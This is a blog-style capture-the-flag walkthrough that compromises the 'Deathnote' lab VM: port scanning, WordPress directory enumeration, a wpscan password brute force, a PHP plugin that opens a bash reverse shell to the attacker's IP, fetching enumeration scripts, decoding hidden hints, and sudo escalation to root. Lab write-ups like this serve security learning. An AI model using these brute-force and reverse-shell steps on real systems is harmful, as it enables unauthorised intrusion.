---
layout: post
title: CTF Deathnote
date:   2022-02-07 19:20:57 -0600
categories: CTF
tags: Linux
---


# Netdiscover

```sh
sudo netdiscover
```
![](https://i.imgur.com/WFcROuF.png)
192.168.0.27 

# nmap
```sh
nmap -sV -p- 192.168.0.27 
```
```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# gobuster

```sh
gobuster dir -t 100 -u http://192.168.0.27 -w Documents/wordlist/directory-list-medium.txt
```
```sh
===============================================================
2022/02/07 19:28:21 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://192.168.0.27/wordpress/]
/manual               (Status: 301) [Size: 313] [--> http://192.168.0.27/manual/]   
/server-status        (Status: 403) [Size: 277]
```

```sh
gobuster dir -t 100 -u http://192.168.0.27/wordpress -w Documents/wordlist/directory-list-medium.txt
```
```sh
===============================================================
2022/02/07 19:30:38 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 327] [--> http://192.168.0.27/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 328] [--> http://192.168.0.27/wordpress/wp-includes/]
/wp-admin             (Status: 301) [Size: 325] [--> http://192.168.0.27/wordpress/wp-admin/]   
```



# /etc/hosts
![](https://i.imgur.com/9frue8A.png)
`/etc/hosts`
```sh
192.168.0.27 deathnote.vuln
```
Now I can load the website. 
![](https://i.imgur.com/YaUlybI.jpg)
# Hint in the source code
view-source:http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/
![](https://i.imgur.com/IpcTseO.png)

```sh
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
```
So user is a list of username and notes should be a list of password.


# brute force wordpress

```sh
echo "iamjustic3" >> user.txt
echo "iamjustic3" >> notes.txt
echo "L" >> user.txt
echo "L" >> notes.txt
```
```sh
wpscan --url http://192.168.0.27/wordpress/ -U user.txt -P notes.txt
```
[SUCCESS] - KIRA / iamjustic3                                                                                                                                                                   
[SUCCESS] - kira / iamjustic3  
Good, now I have to login and upload a revers shell in php.
# Upload the payload
![](https://i.imgur.com/r3E51af.png)

```sh
vim rs.php

<?php 
/**
 * Plugin Name: Peanut's Revers Shell
 * Author: Peanutstick
 */
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.21/4648 0>&1'");
?>
```

```sh
zip -r rs.zip rs.php 
nc -lvp 4648
```

Now I can send the file, and activate it.
![](https://i.imgur.com/Uj1Qzvg.png)
![](https://i.imgur.com/JZ77CUf.png)

# Enumeration
## Downloading my scripts
On my computer:
```sh
python2.7 -m SimpleHTTPServer
```
On the target
```sh
mkdir sc
cd sc
wget http://192.168.0.21:8000/lse.sh
wget http://192.168.0.21:8000/lp.sh
chmod +x lse.sh lp.sh
./lse.sh
./lp.sh
```
Nothing interesting with the lse
lp:
Sound interesting
```sh
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh
```
Good
```sh
╔══════════╣ Analyzing SSH Files (limit 70)

-rw-r--r-- 1 kira kira 393 Jul 19  2021 /home/kira/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote

ChallengeResponseAuthentication no
UsePAM yes
```
Users:
```sh
╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Mon Jul 19 11:26:48 -0400 2021
l                pts/0    192.168.1.6      Sat Sep  4 06:12:29 -0400 2021
kira             pts/1    127.0.0.1        Sat Sep  4 06:00:09 -0400 2021
```

# L home
In the file user.txt
```sh
www-data@deathnote:/home/l$ cat us*     
cat us*
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```
Brainfuck
![](https://i.imgur.com/5rGjTsT.png)
i think u got the shell , but you wont be able to kill me -kira

let's dive deeper.
# /opt/L

```sh
www-data@deathnote:/opt/L/fake-notebook-rule$ file case.wav
file case.wav
case.wav: ASCII text
www-data@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
cat case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```
https://www.convertstring.com/fr/EncodeDecode/HexDecode
And I got this: cGFzc3dkIDoga2lyYWlzZXZpbCA=
https://www.base64decode.org/
And I got this: "passwd : kiraisevil"
`kiraisevil`

I've tried this password with the ssh key and without, it's not for the ssh.

# kira
```sh
su kirra
Password: kiraisevil
id
uid=1001(kira) gid=1001(kira) groups=1001(kira),27(sudo)
```
Spawn a better shell
```sh
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
Read kira.txt
```sh
cat /home/kira/kira.txt

cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```
Oh no... I don't like this.
Nvm let's be root

```sh
$ sudo -l
sudo -l
[sudo] password for kira: kiraisevil                                                                          

Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```
The basic sudo su.
![](https://i.imgur.com/WLlISuT.png)



 
 


